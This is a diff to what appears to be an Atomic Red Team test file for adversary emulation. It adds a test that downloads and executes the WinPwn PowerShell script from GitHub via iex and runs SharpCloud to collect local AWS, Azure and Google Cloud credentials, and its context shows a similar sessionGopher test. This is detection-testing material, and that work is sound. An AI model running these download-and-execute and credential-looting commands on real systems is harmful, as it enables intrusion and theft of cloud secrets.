@@ -130,3 +130,14 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       sessionGopher -noninteractive -consoleoutput
     name: powershell
+- name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
+  description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      SharpCloud -consoleoutput -noninteractive  
+    name: powershell   
+   
